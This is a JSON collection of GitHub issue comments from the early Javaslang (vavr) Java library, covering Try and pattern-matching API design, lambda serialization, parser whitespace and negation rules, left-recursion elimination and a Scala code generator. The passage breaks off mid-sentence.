{
    "vavr-io": "See javaslang.exception.Cause\n. ",
    "danieldietrich": "The new javaslang.collection.Node and Tree implementations will provide several methods for walking trees.\n. groupingBy\n``` java\nMap>> result = myList.stream()\n        .map(Try.of(this::doSomething))\n        .map(trry -> trry.map(i -> Math.PI * i))\n        .collect(Try.groupingBySuccess());\nif (result.containsKey(Type.FAILURE)) {\n    // do something with failure\n} \nif (result.containsKey(Type.SUCCESS)) {\n    // do something with success\n}\n```\nThese could also be created for other monads.\nEither:\n- Either.groupingByRight()\nOption:\n- Option.groupingBySome()\ncollect\njava\nTry<List<Integer>> result = myList.stream().\n            map(Try.lazyOf(this::doSomething)).\n            collect(Try.collect());\n. Making Option, Try et.al. more collection-like is out of focus.\n. Yes, I've seen fj's Validation class. It's a good way for pure functional programming. The Javaslang world takes a simpler appoach by the cost of impurity. Java's well known try/catch\njava\ntry {\n   bunchOfWork();\n} catch(Exception_1 x) {\n   ...\n} catch(Exception_2 x) {\n   ...\n} catch(Exception_n x) {\n   ...\n}\nis replaced by using Javaslang's Try Monad:\njava\nTry(this::bunchOfWork).getOrElse(other);\nor \njava\nTry(this::bunchOfWork).recover(x -> ...).getOrElse(other);\nMaybe in conjunction with the Match API, where Try and Match can be seen as expressions:\njava\nTry(this::bunchOfWork).recover(x -> Matchs\n        .caze((Exception_1 x) -> ...)\n        .caze((Exception_2 x) -> ...)\n        .caze((Exception_n x) -> ...)\n        .apply(x)\n}).getOrElse(other);\nThat's the way Javaslang works. I do not plan to introduce more Try types.\nUpdate: To close the gap between Try and lambdas in general I use checked functions to transport the exceptions from function arguments to the outer scope of higher order functions...\n. Oh, realized that we have done very similar things. Your Validation is mine Try and your `Try``s are the checked functions.\n. # Pattern Matching with Java 8\nMotivation\nIn Scala it is possible to decompose and match complex objects:\nscala\nval option = Option(\"hi\")\noption match {\n   case Some(a : String) => \"str value: \" + a\n   case None => \"no value\"\n}\nHow cool would it be, if something similar were possible with Java!\nApproach\n\nDecompose object\nMatch decomposition result\nProvide decomposition result\n\nDecomposition could take place in two flavors:\n1) Using Tuples\njava\n@FunctionalInterface\ninterface Decomposition<T, R extends Tuple> {\n   R unapply(T obj);\n}\nExample:\n``` java\nclass A {\n   String val1;\n   int val2;\n}\nfinal Decomposition deA = a -> Tuple.of(a.val1, a.val2);\nMatchs.caze(deA, Tuple.of(\"1\", any()), t -> t._2);\nMatchs.caze(deA, Tuple.of(\"1\", any()), (Tuple2 t) -> t._2);\n```\nFurther, the decomposition of objects could be simplified by native support:\njava\ninterface Decomposable<T, R extends Tuple> {\n   Decomposition<T, R> decomposition();\n}\nExample:\n``` java\nclass A implements Decomposable {\n   String val1;\n   int val2;\n@Override\n   Decomposition decomposition() {\n       return a -> Tuple.of(a.val1, a.val2);\n   }\n}\n// would decompose any object\nMatches.caze(Tuple.of(\"1\", any()), t -> t._2);\nMatches.caze(Tuple.of(\"1\", any()), (Tuple2 t) -> t._2);\n// would decompose objects of type A\nMatches.caze(A.class, Tuple.of(\"1\", any()), t -> t._2);\nMatches.caze(A.class, Tuple.of(\"1\", any()), (Tuple2 t) -> t._2);\n```\nPro: simple value object impl\nCon: losing property names\nUsing View interface\nTODO\nPro: explicite types & names\nCon: overhead of defining new types\n. Prototypically implemented. Depends of https://bugs.eclipse.org/bugs/show_bug.cgi?id=442245.\nNeed to implement Pattern.of(...):\njava\npublic static <T, P1, P2, ..., Pn, R1, R2, ..., Rn> Pattern<T, Tuple2<P1, P2, ..., Pn>, Tuple2<R1, R2, ..., Rn>>\n    of(Decomposition<T, Tuple2<R1, R2, ..., Rn>> decomposition, Tuple2<P1, P2, ..., Pn> prototype)\nfor 3 <= n <= 13.\n. Useful links:\n- Stratego rewrite rule\n- treehugger.js\n- treehugger.js playground\n- wikipedia: tree traversal\n- wikipedia: tree data structure\n. I want Tree transformation look like this (stolen from databricks):\nscala\ntree.transform {\n  case Add(Literal(c1), Literal(c2)) => Literal(c1+c2)\n  case Add(left, Literal(0)) => left\n  case Add(Literal(0), right) => right\n}\n. We need a function\njava\nTree.transform(Function<? super Tree<? super T>, ? extends Tree<? extends T> f)\nor\njava\nTree.transform(UnaryOperator<Tree<T>> f)\nCurrently a Node has children of type List<Node>. We need to allow the empty tree and change the type of Node's children to List<Tree>.\n. Note: Removed the transform method because tree.transform(f) is the same as f.apply(tree).\n. Won't be refactored near-time.\n. This: http://cr.openjdk.java.net/~briangoetz/lambda/lambda-translation.html\n. getImplMethodSignature() does only work in simple cases (see javaslang.lambda.Lambdas)\n. Constraint: The lambda has to be Serializable. Here is the test code that shows, that the generic types are erased:\n``` java\npublic class Test {\npublic static void main(String[] args) throws Throwable {\n\n    final Function<Integer, String> f = i -> String.valueOf(i + 1);\n\n    System.out.println(\"f.class: \" + f.getClass());\n    System.out.println(\"f.class.methods: \" + Strings.toString(f.getClass().getMethods()));\n\n    final SerializableFunction<Integer, String> lambda = t -> f.apply(t);\n    final SerializedLambda serializedLambda = Lambdas.getSerializedLambda(lambda).get();\n\n    final Class<?> refc = Class.forName(serializedLambda.getFunctionalInterfaceClass().replaceAll(\"/\", \"\\\\.\"));\n    final String name = serializedLambda.getFunctionalInterfaceMethodName();\n    final MethodType methodType = MethodType.fromMethodDescriptorString(\n            serializedLambda.getFunctionalInterfaceMethodSignature(), lambda.getClass().getClassLoader());\n\n    final MethodHandles.Lookup lookup = MethodHandles.lookup();\n    final MethodHandle methodHandle = lookup.findVirtual(refc, name, methodType);\n\n    System.out.println(\"SERIALIZED LAMBDA: \" + serializedLambda);\n    System.out.println(\"METHOD TYPE: \" + methodType);\n    System.out.println(\"METHOD HANDLE: \" + methodHandle);\n\n    //      final MethodHandle bound = methodHandle.bindTo(lambda);\n    //      System.out.println(\"BOUND METHOD HANDLE: \" + bound);\n    //\n    //      final Object o = bound.invoke(1);\n    //      System.out.println(\"f(1): \" + o);\n\n    final MethodHandleInfo info = lookup.revealDirect(methodHandle);\n    System.out.println(\"METHOD HANDLE INFO: \" + info);\n}\n\n}\n```\nThe main problem with respect to this bug is, that captured variables are part of the signature of the generated runtime lambda. I.e. the signature of the following lambda is (Function, Object) -> Object instead of (Integer) -> String:\njava\nfinal SerializableFunction<Integer, String> lambda = t -> f.apply(t);\nI will investigate, how to create a SerializedLambda instead to keep the correct signature of the underlying Function f.\n. Won't be implemented near-time.\n. Relates to https://github.com/lemurheavy/coveralls-public/issues/263#issuecomment-52902298\n. Fixed.\n. Somewhere on the project page on https://coveralls.io there showed up a red(?) banner containing an input field where I entered the correct path to the project root. Now it is gone on my page. I think that coveralls.io recognizes the broken configuration and gives us the opportunity to fix it directly on the web page.\n. @bdrewery Does it work now for you? I think I clicked on a file and as the error occured (link not found) there was a link or an input field to fix the repository root...\n. Fixed (currently covering 98%).\n. Does it make sense to introduce a Conjunction parser &?\nIt might be useful when negating lexical rules, e.g. language keywords. It offers set-operations on word sets. In other cases the Subrule parser is a conjunction of parsers.\nT1 & ( T2 | T3 )\nUpdate: This is its own story, see #44.\n. Given an Antlr-like parser we distinguish two phases: lexing and parsing:\n- The lexer produces tokens A, B, C\n- The parser has rules which reference other rules and tokens\nThen we have:\n- The negation of a character x is any character but x.\n- Multiple characters (i.e. string literals) cannot be negated.\n- The negation of a token A is the set of tokens minus A.\n- Rules cannot be negated.\nThe Javaslang parser has only one phase. Therefore we can only negate characters, i.e. Any ., Charset [a-z], EOF, Range 'a'..'z' and the Negation ~.\nAlso these hold:\n- ~EOF is Any .\n- No character ~. is EOF.\nExamples:\n- ~'a'..'z', ~'a'..'z'*, (~('a'..'z'))*\n- ~[a'-'z'], ~[a'-'z']*, (~([a'-'z']))*\n- ~~.\n. match negated result (match xor negated)\n  1      1      0            0\n  0      1      1            1\n  1      0      1            1\n  0      0      0            0\n. Negation is allowed on elements which implement NegatableRulePart, which are currently parsers which represent/parse at most one character and Negation itself:\n- Any\n- EOF\n- Charset\n- Negation\n- Rangle\n. Because we have a left-recursive, descent parser and the first matching alternative wins, the precedence is handled implicitly by order of rule alternatives.\n. Set associativity of an operator (read: rule part) by introducing additional non-terminals.\nSee - \"Modern Compiler Implementation in Java, 2nd Ed. (Andrew W. Appel, 2007): 44\n. moved to javaslang-parser\n. Depends on #33 \n. moved to javaslang-parser\n. Have to rethink this in general. Javaslang should provide functional best practices to lift every-day object-oriented java-programming to a new level by targeting use cases like error handling, null handling, conciseness, pattern matching and a great collections api. Functional purity is out of focus for the sake of simplicity.\n. This is (currently) out of scope of Javaslang. The scope of Javaslang is to help Java developers with everyday object oriented programming. With the help of Java 8's new lambda features Javaslang provides new, concise APIs / Java language extensions. Javaslang contains functional features without forcing a software developer to act purely functional. Immutability is most important for a good programming style because it helps us to reason about programs.\n. Follow the comment in the Gist mentioned above: https://github.com/ktoso/akka/commit/5e14c2db4b6a57f3bdbbd68301a969b1b1d5ab4b\n. this. isn't. possible. (yet)\n. Given WS : [ \\t\\r\\n]+ ;, i.e. parser tokens have to be separated by non-empty whitespace, there are the following rules:\n- in a sequence, parser rule references rule1 and rule2 are separated by whitespace\n- a multiplied parser rule rule, using a quantifier ?, + or *, is separated by whitespace\n- a lexer rule RULE does not eat up whitespace automatically\nQuestion:\nHow to cope with punctuation / inline lexer rules abc 'LEX' def regarding whitespace?\n. More specifically, the following grammar should parse these sentences:\n- (abc)(def ghi)\n- ( abc ) ( def ghi )\nGrammar:\n```\ngroups : group*\ngroup : '(' WORD+ ')'\nWORD : 'a'..'z'+\n```\ngiven a whitespace configuration of WS : [ \\t\\r\\n]+.\n\nDoes this make sense?\nHow should the parser behave different when WS : [ \\t\\r\\n]* and WS : [ \\t\\r\\n]+?\nThe current implementation works with both WS definitions, using +and *:\njava\nstatic int skipWhitespace(String text, int index, boolean lex) {\n    return lex ? index : endIndex(DEFAULT_WS.parse(text, index, true)).orElse(index);\n}\n\nQuestion: What if WORD : [ a-z]+, i.e. may contain spaces?\nQuestion: Is this equivalent?\ngroups : ( '(' [a-z]+ ( [a-z]+ )* ')' )*\nDoes a quantifier participate on a lexical context (whitespace)?\nDo outer braces participate on a lexical context (whitespace)?\nOne possible Answer: A plain Literal is handeled special (whitespace ignored) as inline lexer rule in a sequence but not when bound to a quantifier. Braces make no difference to whitespace handling. Charset and Range are handled as normal tokens in a parser rule, i.e. separated by whitespace.\nExample:\nrichString : '\"\"\"' .*? '\"\"\"'\nUpdate:\nThe answer above seems to not solve the problem in practice. Also the richString example is wrong because the .*? does skip whitespace. It should be RichString : '\"\"\"' .*? '\"\"\"' instead. But what if the rule name richString is needed as part of the parse tree?\n. Two whitespace-handling rules would be great:\n- defensive / non-greedy -> eat only up if next parser does not need the whitespace\n- offensive / greedy -> eat all up\nThis should be accomplishable by\n- WS : [ \\t\\r\\n]+? (defensive)\n- WS : [ \\t\\r\\n]+ (offensive)\n. # Whitespace variants\n``` java\nWS : [ \\t\\r\\n]+?  // (defensive / non-greedy)\nWS : [ \\t\\r\\n]+   // (offensive / greedy)\nstatic int skipWhitespace(String text, int index, boolean lex) {\n    return lex ? index : endIndex(WS.parse(text, index, true)).orElse(index);\n}\n```\nExample 1: Group grammar\nVariant 1\n``` java\n//\n// group is identified => whitespace is eaten up.\n// * quantifier inherits behavior of group => whitespace is eaten up.\n//\n// ==> the Quantifier parser is reponsible for eating up whitespace before and after group.parse()\n//\ngroups : group*\n//\n// sequence does not eat up whitespace by itself.\n// children:\n//   '(' is lexical and does not eat up whitespace.\n//   WORD is identified => whitespace is eaten up.\n//   + quantifier inherits behavior of WORD => whitespace is eaten up.\n//   ')' is lexical and does not eat up whitespace.\n//\n// ==> the Sequence parser is reponsible for eating up whitespace before and after WORD.parse()\n//\ngroup : '(' WORD+ ')'\n//\n// range 'a'..'z' is lexical and does not eat up whitespace.\n// + quantifier inherits behavior of range => whitespace is not eaten up.\n//\n// ==>  the Quantifier parser is reponsible for not eating up whitespace before and after range.parse()\n//\nWORD : 'a'..'z'+\n```\nVariant 2\njava\ngroups : ( '(' [a-z]+ ( [a-z]+ )* ')' )*\nInput\n\n(abc)(def ghi)\n( abc ) ( def ghi )\n\njava\n// the spaces within '( ... )' are parsed because of WORD+ eats up whitespace.\n// the spaces between ') ... (' are parsed because of group* eats up whitespace.\nParse Tree\njava\n// result of both inputs parsed with variant 1 and result of 1st input parsed with variant 2. 2nd input is not parsable by variant2.\nTree(groups (group '(' 'abc' ')') (group '(' 'def' 'ghi' ')'))\nExample 2: Rich string grammar\njava\n//\n// sequence does not eat up whitespace by itself.\n// children:\n//   '\"\"\"' is lexical and does not eat up whitespace.\n//   . is lexical and does not eat up whitespace.\n//   * quantifier inherits behavior of . => whitespace is not eaten up.\n//   ? non-greedy operator inherits behavior of .* => whitespace is not eaten up.\n//   '\"\"\"' is lexical and does not eat up whitespace.\n//\n// ==> the Sequence parser is reponsible for eating up whitespace before and after WORD.parse()\n// ==> the Quantifier parser COMBINES results, if child parser is lexical\n// ==> the non-greedy operator just makes a binary decision: eat up more chars with current parser or proceed with next parser, if applicable.\n//\nrichString : '\"\"\"' .*? '\"\"\"'\nInput\njava\n\"\"\" test \"\"\"\nParse Tree\njava\nTree(richString '\"\"\"' ' test ' '\"\"\"')\n. It should be sufficient (and more effective) to invent a new parser 'RuleRef', which eats up whitespace. Then quantifier does not have to inherit the behavior of its underlying parser.\nA RuleRef is like a pointer to a Parser. If it is initialized with a Supplier, i.e. RuleRef( () -> new Literal(\"xyz\") ) or RuleRef( SomeClass::parser() ), then all parsers with children can be simplified to encapsulate Parser instead of Supplier.\n. This will generate a hex string representation of the char:\njava\nchar ch = '\u00f6';\nString hex = String.format(\"%04x\", (int) ch);\nAnd this will convert the hex string back into a char:\njava\nint hexToInt = Integer.parseInt(hex, 16);\nchar intToChar = (char)hexToInt;\n- taken from stackoverflow\n. moved to javaslang-parser\n. Consider adding attribution with annotations. It is more consistent to use a single syntactic element to augment grammar rules with meta information for processing parser input.\n1) At rule definitions:\n```\n@skip\n* : WS | COMMENT\nrule : ID ':' rulePart ( '|' rulePart )*\n@fragment\nrulePart : ruleRef | sequence | ...\n```\nNotes:\n- Annotations are denoted in front of an element\n- @skip is the same as @skip=true\n2) At rule parts:\n```\n* : @skip WS | COMMENT // skips whitespace\n\n: @skip ( WS | COMMENT ) // skips whitespace and comments\n```\n\nExample:\n* : @skip [ \\n\\r\\t]+                                   // whitespace\n  | '//' @name=text !( EOL | EOF ) @skip ( EOL | EOF ) // single-line comment\n  | '/*' @name=text !'*/' @skip '*/'                   // multi-line comment\nFor better readability braces may be used:\n* : @skip [ \\n\\r\\t]+                                           // whitespace\n  | '//' ( @name=text !( EOL | EOF ) ) ( @skip ( EOL | EOF ) ) // single-line comment\n  | '/*' ( @name=text !'*/' ) ( @skip '*/' )                   // multi-line comment\nTip: Use fragments when more attributes are needed:\n```\n : @skip [ \\n\\r\\t]+                         // whitespace\n  | '//' ( @name=text !End ) ( @skip End )   // single-line comment\n  | '/' ( @name=text !'/' ) ( @skip '/' ) // multi-line comment\n@fragment\n@attribute1=value1\n@attribute2=value2\n@attribute3=value3\nEnd : EOL | EOF\n``\n. Another idea is to write\n--ruleinstead of@fragment rule(semantic: produces(a b c)instead of(a (rule b c)))\n--rulePartinstead of@skip rulePart` (semantic: omits a node (and its children) completely)\nbecause it is not so much noise.\n. moved to javaslang-parser\n. Change Quantifier implementation / constructor:\nQuantifier(Supplier<Parser> parserSupplier, int lowerBound, int upperBound)\nand initially parse lowerBound times.\n. Generalize Quantifier implementation by\n1. removing Bounds enum\n2. changing constructor to Quantifier(int lowerBound, int upperBound), where 0 <= lowerBound <= upperBound < \u221e and 0 < upperBound.\n   - ? maps to Quantifier(0, 1)\n   -  * maps to Quantifier(0, Integer.MAX_VALUE)\n   - + maps to Quantifier(1, Integer.MAX_VALUE)\n3. changing parse impl by first trying to parse lowerBound times and then trying to parse upperBound times\n. Depends on #33\n. A simple and consistent solution. We define a non-greedy operator as function:\n<op>? : rulePart x rulePart -> rulePart\nwhere <op> in { ?, *, + }\nand T1 <op>? T2 := (T1 & !T2)<op> T2.\nNote: Currently negation ! for tokens other than single chars and filtering & are not defined/implemented.\nExample: comment : '/*' .*? '*/' = comment : '/*' ( . & !'*/' )*\n. moved to javaslang-parser\n. Next step is to add appropriate test-cases.\n. The grammar rules have to be transformed on parser generation in order to keep the parser slim. For direct recursion in left-recursive, descend parsers this is well understood.\nIt is essential here to also support indirect recursion. This form of grammar notation is natural and provides the language designer with a good developer experience.\nThis needs further reading (in that order):\n1. Computability and Logic (Boolos - Burgess - Jeffrey, 2007)\n2. Computability: An Introduction to Recursive Function Theory (Cutland, 1980)\n3. Theory of Recursive Functions and Effective Computability (Rogers, 1987)\nAdditionaly:\n- On Monadic Theories of Monadic Predicates\n- Introduction to Computability Theory\n. Check this strategy:\n- Descend recursively into rules. Example: read : next | ; next : read '.'\n- Check if current rule part eats chars. Rule part read '.' eats 1 char => following rules can eat text.length - 1 chars at max.\n- If no chars remain we are finished (modulo EOF and empty rules).\nThere is one more thing: If we have a cycle in which no chars are eaten, then we loop forever - or at least until the stack overflows.\nExample: ping : pong | . ; pong : ping | . (Q: which . is taken and why?)\nTo prevent this, we have to detect such cycles, that should be all. Of course the calls can be more complicated than this simple example but 1) the paths / the call stack in addition to 2) the remaining chars available (see strategy above) should tell us exactly when we are doomed to looped forever.\n. Note:\nThis issue describes a superset of #54 because the rules of the ping-pong example above have standalone recursive alternatives.\n. It may be helpful to add an emergency stop which is triggered automatically, if the parser loops indefinitely long.\n. Duplicate of #54.\n. See this:\n- Wikipedia - Bootstrapping (compilers)\n- Bootstrapping a simple compiler from nothing\nAnd this:\n- Write a compiler C1 for language X in language Y\n- Use the compiler C1 to write compiler C2 for language X in language X\n- Now C2 is a fully self hosting environment.\nIdea: Compare the serialized bytes of a compiled grammar/parser:\n\"It is a comprehensive consistency check as it should be able to reproduce its own object code.\"\nNote: We do not have here different languages but we can verify that the generated grammar parser is equivalent to the handcrafted parser.\n. Depends on #9 \n. Depends on #54, #58 (see BootstrapTest.shouldBootstrapJavaslangGrammar())\n. moved to javaslang-parser\n. Changing direction: do not write a template language, use Scala instead. I've already done indentation so far. Perhaps I should create a separate generator framework project for that...\n. 1) Classpath\nWe don't want to pollute our source dirs with generator code. A nice solution for that is to run scala script because it does not need a classpath:\nxml\n<project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd\">\n    <modelVersion>4.0.0</modelVersion>\n    <prerequisites>\n        <maven>3.0.0</maven>\n    </prerequisites>\n    <groupId>com.javaslang</groupId>\n    <artifactId>generator</artifactId>\n    <version>0.0.1-SNAPSHOT</version>\n    <packaging>jar</packaging>\n    <properties>\n        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>\n    </properties>\n    <build>\n        <plugins>\n            <plugin>\n                <groupId>net.alchim31.maven</groupId>\n                <artifactId>scala-maven-plugin</artifactId>\n                <version>3.2.0</version>\n                <executions>\n                    <execution>\n                        <phase>generate-sources</phase>\n                        <goals>\n                            <goal>script</goal>\n                        </goals>\n                    </execution>\n                </executions>\n                <configuration>\n                    <scalaVersion>2.11.5</scalaVersion>\n                    <scriptFile>generator/Generator.scala</scriptFile>\n                </configuration>\n            </plugin>\n        </plugins>\n    </build>\n</project>\n2) Scala dependencies\nJavaslang's pom should contain no dependencies, especially no scala dependencies.\nThe Maven Deploy Plugin seems to be able to deploy an alternate pom. The minimal pom should only include a copyright and no dependencies / plugins!\n3) Code generator\nA code generator example (as scala script):\n``` scala\nimport scala.util.Properties.lineSeparator\nimport StringContextImplicits._\n// entry point\ndef run() {\n// lazy due forward reference\n  lazy val output = gen(\"Person\", Seq(\"name\" -> 'String, \"age\" -> 'Int))\nprintln(output)\n}\ndef gen(name: String, params: Seq[(String,Symbol)]) = xs\"\"\"\n      package model\n  case class $name(${genParams(params)}, id: Option[Long] = None)\n\n  trait ${name}Component { self: Profile =>\n\n    import driver.simple._\n    import Database.threadLocalSession\n\n    object $name extends Table[$name](\"${name.toUpperCase}\") {\n\n      def id = column[Long](\"ID\", O.PrimaryKey, O.AutoInc)\n      ${genColumns(params)}\n\n      def * = ${params.map(_._1).mkString(\" ~ \")} ~ id.? <> ($name, $name.unapply)\n\n      def delete(id: Long) = db withSession {\n        Query(this).where(_.id is id).delete\n      }\n\n      def findById(id: Long) = db withSession {\n        Query(this).where(_.id is id).firstOption\n      }\n\n      def save(${name.toLowerCase}: $name) = db withSession {\n        ${name.toLowerCase}.id.fold {\n          this.insert(${name.toLowerCase})\n        }{ id =>\n          Query(this).where(_.id is id).update(${name.toLowerCase})\n        }\n      }\n    }\n  }\n\n\"\"\"\ndef genParams(params: Seq[(String,Symbol)]) = params map {\n    case (name, _type) => name + \": \" + _type.name\n} mkString(\", \")\ndef genColumns(params: Seq[(String,Symbol)]) = params map {\n    case (name, _type) => xs\"\"\"def ${name.toLowerCase} = column${_type.name}\"\"\"\n} mkString(\"\\n\")\n/*\n * (C)opyright by Daniel Dietrich\n /\nobject StringContextImplicits {\nimplicit class StringContextExtension(sc: StringContext) {\ndef xs(args: Any*) : String = align(sc.s, args)\n\ndef xraw(args: Any*) : String = align(sc.raw, args)\n\n/**\n * Indenting a rich string, removing first and last newline.\n * A rich string consists of arguments surrounded by text parts.\n */\nprivate def align(interpolator: Seq[Any] => String, args: Seq[Any]) = {\n\n  // indent embedded strings, invariant: parts.length = args.length + 1\n  val indentedArgs = for {\n    (part,arg) <- sc.parts zip args.map(s => if (s == null) \"\" else s.toString)\n  } yield {\n    // get the leading space of last line of current part\n    val space = \"\"\"([ \\t]*)[^\\s]*$\"\"\".r.findFirstMatchIn(part).map(_.group(1)).getOrElse(\"\")\n    // add this leading space to each line (except the first) of current arg\n    arg.split(\"\\r?\\n\") reduce(_ + lineSeparator + space + _)\n  }\n\n  // remove first and last newline and split string into separate lines\n  // adding termination symbol \\u0000 in order to preserve empty strings between last newlines when splitting\n  val split = (interpolator(indentedArgs).replaceAll(\"\"\"(^[ \\t]*\\r?\\n)|(\\r?\\n[ \\t]*$)\"\"\", \"\") + '\\u0000').split(\"\\r?\\n\")\n\n  // find smallest indentation\n  val prefix = split filter(!_.trim().isEmpty) map { s =>\n    \"\"\"^\\s+\"\"\".r.findFirstIn(s).getOrElse(\"\")\n  } match {\n    case prefixes: Array[String] if prefixes.length > 0 => prefixes reduce { (s1, s2) =>\n      if (s1.length <= s2.length) s1 else s2\n    }\n    case _ => \"\"\n  }\n\n  // align all lines\n  split map { s =>\n    if (s.startsWith(prefix)) s.substring(prefix.length) else s\n  } mkString(lineSeparator) dropRight(1) // dropping termination character \\u0000\n}\n\n} \n}\n```\n. Yes, Xtext is great (I know Sven and his team well, they are located here in Kiel).\nI switched to IntelliJ because of problems with ECJ/Javac. I talked with Sebastian Zarnekow, they work on better tool support, i.e. IntelliJ integration.\nMy acceptance criteria for code generation in Javaslang are:\n- it is part of the maven build process\n- the generator sources are not added to the default build path of the project\n- the generated sources are not checked in\nMinor:\n- the output looks nice / pretty printed\n. I like it, too, to see the source in the vcs. In projects with many people there is the risk that sources run out of sync with the generator templates or people start to change generated code. However, for Javaslang the risk is nearly zero :-))\n. This makes no sense. With #227 Match returns a value rather than nothing.\n. Will be done in #40 \n. A use case is missing. Why not instead creating a full fledged Traversable or Seq and move Tuple to javaslang.collection? A Tuple should be a just a Tuple.\n. Also do this (source: #38):\n- zip\n- unzip\n- splitAt\n- takeWhile\n- dropWhile\n- ...\n. Out of focus. Replaced with javaslang.collection.Stream\n. Also allow functions as argument.\n. moved to javaslang-parser\n. See also #62.\n. moved to javaslang-parser\n. Duplicate of #57. We would write:\nexpr\n  : ( Mul : expr '*' expr )\n  | ( Add : expr '+' expr )\n  | ( Int : INT )\n. With #59 this is not possible.\n. There will be an Allstar rule which allows to handle general tokens like whitespace and comments:\n* : -( WS | COMMENT )\n. moved to javaslang-parser\n. Fixed\n. Don't build a second Antlr. The Parser framework is part of Javaslang - it is Java centric.\nThis leads to the following:\n- a negation should be ! instead of ~, which is more natural for Java devs\n. moved to javaslang-parser\n. move to javaslang-parser\n. Karen Lemone provided an algorithm for elimination of left-recursion. The version presented here has fixed several little bugs. Please note that javaslang.Parser uses (first letter) upper case rule identifiers to represent tokens. In contrast, the upper case identifiers here denote non-terminals.\nSolve Left-Recursion\nThere is a formal technique for eliminating left-recursion from productions\nStep One: Direct-Recursion\nFor each rule which contains a left-recursive option\nA : A \u03b1 | \u03b2\nintroduce a new nonterminal A' and rewrite the rule as\nA  : \u03b2 A' \nA' : \u03b1 A' | \u03b5\nwhere \u03b5 is the empty alternative. Thus the production:\nE : E + T | T\nis left-recursive with \"E\" playing the role of \"A\",\"+ T\" playing the role of \u03b1, and \"T\" playing the role of \u03b2. Introducing the new nonterminal E', the production can be replaced by:\nE  : T E' \nE' : + T E' | \u03b5\n\nGiven multiple recursive calls within one rule alternative, only the first recursive occurrence is substituted: E : E + E | T is replaced by E  : T E' and E' : + E E' | \u03b5\nA rule with just one alternative may be substituted in place: A : A \u03b1 is replaced by A : \u03b1 A | \u03b5\n\nOf course, there may be more than one left-recursive part on the right-hand side. The general rule is to replace:\nA : A \u03b11 | A \u03b12 | ... | A \u03b1n | \u03b21 | \u03b22 | ... | \u03b2m\nby\nA  : \u03b21 A' | \u03b22 A' | ... | \u03b2m A'\nA' : \u03b11 A' | \u03b12 A' | ... | \u03b1n A' | \u03b5\nNote that this may change the \"structure\". For the expression above, the original grammar is left-associative, while the non-left-recursive one is now right-associative.\nStep Two: Indirect-Recursion\nStep one describes a rule to eliminate direct left-recursion from a production. To eliminate left-recursion from an entire grammar may be more difficult because of indirect left-recursion. For example,\n```\nA : B x y | x\nB : C D\nC : A | c\nD : d\n```\nis indirectly recursive because\nA \u2192 B x y \u2192 C D x y \u2192 A D x y.\nThat is, A \u2192 ... \u2192 A \u03c9 where \u03c9 is D x y.\nThe following algorithm eliminates left-recursion entirely. It contains a \"call\" to a procedure which eliminates direct left-recursion (as described in step one).\nArrange the non-terminals in some Order A1, A2, ..., An.\nfor (i = 1 to n) {\n    for (j = 1 to n) {\n        1. Replace each production of the form Ai -> Aj \u03b3 by the productions\n               Ai : \u03b41 \u03b3 | \u03b42 \u03b3 | ... | \u03b4k \u03b3\n           where\n               Aj : \u03b41 | \u03b42 | ... | \u03b4k\n           are all the current Aj - productions.\n        2. Eliminate the direct left-recursion from the Ai productions\n    }\n}\nExample\nHere is an illustration of this algorithm for the grammar of the example above.\nArrange the nonterminals in some order: A1 = A, A2 = B, A3 = C, A4 = D\ni = 1, j = 1:\n1. No productions of the Form A : A \u03b3\n2. No direct left-recursion for A\ni = 1, j = 2:\n1. Replace A : B x y with A : C D x y\n2. Still no direct left-recursion for A\ni = 1, j = 3:\n1. Replace A : C D x y with A : A D x y and A : c D x y\n2. Eliminate direct left-recursion for A : A D x y. Replace it with A : c D x y A', A : x A' and A' : D x y A' | \u03b5\ni = 1, j = 4:\n1. No productions of the form A : D \u03b3\n2. No direct left-recursion for A\ni = 2, j = 1:\n1. No productions of the form B : A \u03b3\n2. No direct left-recursion for B\ni = 2, j = 2:\n1. No productions of the form B : B \u03b3\n2. No direct left-recursion for B\ni = 2, j = 3:\n1. Replace B : C D with B : A D and B : c D\n2. No direct left-recursion for B\ni = 2, j = 4:\n1. No productions of the form B : D \u03b3\n2. No direct left-recursion for B\ni = 3, j = 1:\n1. Replace C : A with C : c D x y A and `C : x A'\n2. No direct left-recursion for C\ni = 3, j = 2:\n1. No productions of the form C : B \u03b3\n2. No direct left-recursion for C\ni = 3, j = 3:\n1. No productions of the form C : C \u03b3\n2. No direct left-recursion for C\ni = 3, j = 4:\n1. No productions of the form C : D \u03b3\n2. No direct left-recursion for D\ni = 4, j = 1:\n1. No productions of the form D : A \u03b3\n2. No direct left-recursion for D\ni = 4, j = 2:\n1. No productions of the form D : B \u03b3\n2. No direct left-recursion for D\ni = 4, j = 3:\n1. No productions of the form D : \u03b3\n2. No direct left-recursion for D\ni = 4, j = 4:\n1. No productions of the form D : D \u03b3\n2. No direct left-recursion for D\nThe resulting grammar is\nA  : c D x y A'\nA  : x A'\nA' : D x y A' | \u03b5\nB  : A D\nB  : c D\nC  : c D x y A'\nC  : x A'\nD  : d\n. Empty alternatives are needed to implement elimination of direct left-recursion.\nDepends on #45.\n. Eliminating subrules:\n- a ( b | c ) = a b | a c\n- ( a | b ) c = a c | b c\nUpdate: We can rewrite\n- rule : a ( b | c ) d\nby using an auxiliary rule\n- aux : b | c\n- rule : a aux c\n- \"Modern Compiler Implementation in Java, 2nd Ed. (Andrew W. Appel, 2007): 39\nSubstituting quantifiers (preparation for eliminating left-recursion):\nrule : a? b      ->  rule : b | a b\nrule : a+ b      ->  rule : a a* b\nrule : a* b      ->  rule : b | a a* b   // = rule : b | a+ b\nrule : a{0,0} b  ->  rule : b\nrule : a{0,m} b  ->  rule : b | a a{0,m} b\nrule : a{n,m} b  ->  rule : a a{n-1,m} b\nUpdate: Substituting nested quantifiers will not work in general (counter example below).\n. Oh noes...\nrule : (rule?)+ 'x'                                   // a+ = a a*\n= rule : rule? (rule?)* 'x'                             // a? = \u03b5 | a\n= rule : ( \u03b5 |\u00a0rule ) (rule?)* 'x'                      // ( a | b ) c = a c | b c\n= rule : (rule?)* 'x' | rule (rule?)* 'x'               // a* = \u03b5 | a a*\n= rule : ( \u03b5 |\u00a0rule? (rule?)* ) 'x' | rule (rule?)* 'x' // ( a | b ) c = a c | b c\n= rule : 'x' | rule? (rule?)* 'x' | rule (rule?)* 'x'   // again we have \"rule? (rule?)* 'x'\"\n= \u22a5\nConslusion: First eliminate nested 